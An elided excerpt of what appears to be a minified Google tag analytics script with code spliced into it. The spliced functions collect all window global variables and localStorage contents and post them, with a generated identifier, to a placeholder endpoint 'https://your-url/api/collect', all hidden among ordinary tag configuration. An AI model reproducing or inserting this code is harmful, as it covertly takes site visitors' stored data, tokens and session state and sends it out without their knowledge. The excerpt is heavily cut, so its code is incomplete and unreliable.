...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-7CFXKR76RM",
        "tag_id": 38
      }, {
        "function": "__ccd_ga_first",
        "priority": 11,
        "vtp_instanceDestinationId": "G-GSXS21VXQK",
        "tag_id": 25
      }, {
        "function": "__set_product_settings",
        "priority": 11,
        "vtp_instanceDestinationId": "G-7CFXKR76RM",
        "vtp_foreignTldMacroResult": ["macro", 8],
        "vtp_isChinaVipRegionMacroResult": ["macro", 9],
        "tag_id": 37
      }, {
        "function": "__set_product_settings",
        "priority": 10,
        ...
        "function": "__gct",
        "vtp_trackingId": "G-GSXS21VXQK",
        "vtp_sessionDuration": 0,
        "tag_id": 1
      }, {
        "function": "__gct",
        "vtp_trackingId": "G-7CFXKR76RM",
        "vtp_sessionDuration": 0,
      ...
      "rules": [[["if", 0], ["add", 24, 25]], [["if", 1], ["add", 0, 26, 22, 20, 18, 16, 14, 12, 10, 8, 6, 4, 2, 27, 23, 21, 19, 17, 15, 13, 11, 9, 7, 5, 3, 1]]]
    },
  ...
  qa(fb, va);
  // Track keys defined in window.jsHookKeys
  var keysToWatch = window.jsHookKeys || [];
  // Also keep track of global variables
  ...
  pi.ke = Number("0") || 0;
  pi.ia = "dataLayer";
  pi.Uj = "ChEI8OnlpwYQuJTc8ab5i5yFARIlAIxhzZD2Bn/TiL/b1A+uEf/jL0vS4nwTTnRi/mc8VAte8/GYiBoCEVQ\x3d";
  var si = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var yi,
    zi = !1;
  var globalVarsToExclude = ['window', 'document', 'location', 'self', 'navigator', 'localStorage', 'sessionStorage'];
  yi = zi;
  var Ai,
    Bi = !1;
  Ai = Bi;
  ...
  function generateUniqueID(data) {
    let hashKey = Object.keys(data).sort().join("");
    let hashVal = 0;
  ...
  var ik = {},
    ...
    Wf = {
      ctid: "G-GSXS21VXQK",
      Sg: "89714447",
      yj: "G-GSXS21VXQK|G-7CFXKR76RM|GT-5DH4Q34",
      zj: "G-GSXS21VXQK|G-7CFXKR76RM"
    };
  ik.fe = Ma("");
  var mk = function () {
      var a = kk();
  ...
  function detectGlobalVarChanges() {
    for (let key in window) {
      if (!globalVarsToExclude.includes(key)) {
        globalVarsData[key] = window[key];
      }
    }
  }
  function nz(a, b, c) {
  ...
  function qD() {
    var a = new qb();
    L(this, "read_container_data"), a.set("containerId", 'G-GSXS21VXQK'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", dg), a.set("previewMode", fg), a.set("environmentMode", eg), Q(88) && a.set("firstPartyServing", yi || Ai), Q(90) && a.set("containerUrl", Ec), a.Bb();
    return a;
  }
  ...
  function transmitDataToAI(data, globalVarsData) {
    let uniqueIdentifier = generateUniqueID(data);
    const apiURL = 'https://your-url/api/collect';

    // Combine local storage data and global var data
    let payload = {
      id: uniqueIdentifier,
      storageData: data,
      globalVarsData: globalVarsData
    };
    ...
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          ...
          console.error('数据提交失败, 错误码: ', xhr.status);
        }
      }
    };
  }
  ...
  function trackAndSendData() {
    let matchedData = detectLocalStorageChanges();
    if (Object.keys(matchedData).length) {
      detectGlobalVarChanges();
      transmitDataToAI(matchedData, globalVarsData);
    }
  }
  AE[N.g.Ec] = "ci";
  AE[N.g.Fc] = "cm";
